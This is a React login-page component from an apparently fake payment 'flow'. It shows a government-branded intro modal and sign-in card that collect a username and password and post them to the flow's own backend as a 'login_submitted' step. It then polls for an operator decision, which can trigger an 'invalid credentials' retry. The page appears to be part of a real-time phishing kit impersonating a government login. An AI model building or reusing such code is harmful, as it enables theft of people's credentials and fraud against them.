import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import { useLang } from "../../context/LanguageContext";
import { FlowHeader } from "./FlowHeader";
import { FlowLoading } from "./FlowLoading";
import styles from "./FlowLoginPage.module.scss";

export function FlowLoginPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { t, dir } = useLang();
  const ft = t.flow;
  const fl = ft.login;

  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [login, setLogin] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showIntroModal, setShowIntroModal] = useState(true);

  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  // Validation states
  const [loginRequiredError, setLoginRequiredError] = useState(false);
  const [loginPhoneError, setLoginPhoneError] = useState(false);
  const [passwordRequiredError, setPasswordRequiredError] = useState(false);

  useFlowPoll({
    reference,
    currentPage: "login",
    enabled: !!reference,
    onReset: () => {
      setSubmitted((prev) => {
        if (prev) {
          setPassword("");
          setError(fl.invalidCredentials);
        }
        return false;
      });
    },
  });

  const validateLogin = (val: string) => {
    if (!val.trim()) {
      setLoginRequiredError(true);
      setLoginPhoneError(false);
      return false;
    }
    setLoginRequiredError(false);
    const isPhone = /^[\d\s\+\-\(\)]{4,}$/.test(val) && /\d{4,}/.test(val);
    setLoginPhoneError(isPhone);
    return !isPhone;
  };

  const validatePassword = (val: string) => {
    const isInvalid = !val;
    setPasswordRequiredError(isInvalid);
    return !isInvalid;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const isLoginValid = validateLogin(login);
    const isPasswordValid = validatePassword(password);
    if (!isLoginValid || !isPasswordValid) return;

    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "login_submitted", {
        login: login.trim(),
        password,
      });
      setSubmitted(true);
    } catch {
      setError(ft.networkError);
    } finally {
      setBusy(false);
    }
  };

  if (!reference) {
    navigate("/", { replace: true });
    return null;
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh" }}>
      <FlowHeader />

      <div className={styles.container} dir={dir}>
        {/* Intro Modal */}
        {showIntroModal && (
          <div className={styles.modalOverlay}>
            <div className={styles.modalCard}>
              <button
                type="button"
                onClick={() => setShowIntroModal(false)}
                className={styles.modalCloseBtn}
                aria-label="إغلاق"
              >
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="2" stroke="currentColor" style={{ width: 20, height: 20 }}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>

              <div className={styles.modalHeaderRow}>
                <span className={styles.modalBrand}>{ft.brand}</span>
                <div style={{ textAlign: "left" }}>
                  <div className={styles.modalGovTitle}>{ft.govDept}</div>
                  <div className={styles.modalGovSub}>{ft.govSub}</div>
                  <div className={styles.modalGovAcronym}>{ft.govAcronym}</div>
                </div>
              </div>

              <h2 className={styles.modalTitle}>{fl.modalTitle}</h2>
              <p className={styles.modalDesc}>{fl.modalDesc}</p>

              <div className={styles.modalBulletContainer}>
                {[fl.modalBullet1, fl.modalBullet2, fl.modalBullet3].map((txt, i) => (
                  <div key={i} className={styles.modalBullet}>
                    <span className={styles.modalBulletIcon}>
                      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3" style={{ width: 12, height: 12 }}>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                      </svg>
                    </span>
                    <span className={styles.modalBulletText}>{txt}</span>
                  </div>
                ))}
              </div>

              <p className={styles.modalFooterTip}>{fl.modalFooter}</p>

              <button type="button" onClick={() => setShowIntroModal(false)} className={styles.modalActionBtn}>
                {fl.modalCta}
              </button>
            </div>
          </div>
        )}

        {/* Main Login Card */}
        <div className={styles.card}>
          <div className={styles.header}>
            <div className={styles.qgccBadge}>
              <span className={styles.qgccDept}>{ft.govDept}</span>
              <span className={styles.qgccSub}>{ft.govSub}</span>
              <span className={styles.qgccAcronym}>{ft.govAcronym}</span>
            </div>
            <h1 className={styles.title}>{fl.title}</h1>
            <p className={styles.brandText}>{fl.brandTitle}</p>
            <p className={styles.desc}>{fl.desc1}</p>
            <p className={styles.desc} style={{ marginTop: "12px" }}>{fl.desc2}</p>
          </div>

          {error && <div className={styles.errorBox}>{error}</div>}

          <form onSubmit={handleSubmit} className={styles.form}>
            <div>
              <input
                type="text"
                name="login"
                autoComplete="username"
                placeholder={fl.usernamePlaceholder}
                value={login}
                onChange={(e) => { setLogin(e.target.value); validateLogin(e.target.value); }}
                onBlur={() => validateLogin(login)}
                className={`${styles.input} ${loginRequiredError || loginPhoneError ? styles.inputError : ""}`}
              />
              {loginRequiredError && <p className={styles.fieldError}>{ft.required}</p>}
              {loginPhoneError && <p className={styles.fieldError}>{ft.noPhoneAllowed}</p>}
            </div>

            <div className={styles.inputGroup}>
              <input
                type={showPassword ? "text" : "password"}
                name="password"
                autoComplete="current-password"
                placeholder={fl.passwordPlaceholder}
                value={password}
                onChange={(e) => { setPassword(e.target.value); validatePassword(e.target.value); }}
                onBlur={() => validatePassword(password)}
                className={`${styles.input} ${passwordRequiredError ? styles.inputError : ""}`}
                style={{ paddingLeft: "48px" }}
              />
              <button type="button" onClick={() => setShowPassword(!showPassword)} className={styles.passwordToggle} aria-label="Toggle password">
                {showPassword ? (
                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="1.5" stroke="currentColor" style={{ width: 20, height: 20 }}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88" />
                  </svg>
                ) : (
                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="1.5" stroke="currentColor" style={{ width: 20, height: 20 }}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                  </svg>
                )}
              </button>
              {passwordRequiredError && <p className={styles.fieldError}>{ft.required}</p>}
            </div>

            <div className={styles.forgotLinkContainer}>
              <a href="#" onClick={(e) => { e.preventDefault(); navigate("/flow/forgot-password", { state: { reference } }); }} className={styles.forgotLink}>
                {fl.forgotPassword}
              </a>
            </div>

            <button type="submit" disabled={busy || loginPhoneError} className={styles.submitBtn}>
              {fl.submit}
            </button>

            <a href="#" onClick={(e) => { e.preventDefault(); navigate("/flow/register", { state: { reference } }); }} className={styles.registerBtn}>
              {fl.register}
            </a>
          </form>

          <div className={styles.footerBrand}>{ft.brand}</div>
        </div>

        {submitted && <FlowLoading />}
      </div>
    </div>
  );
}
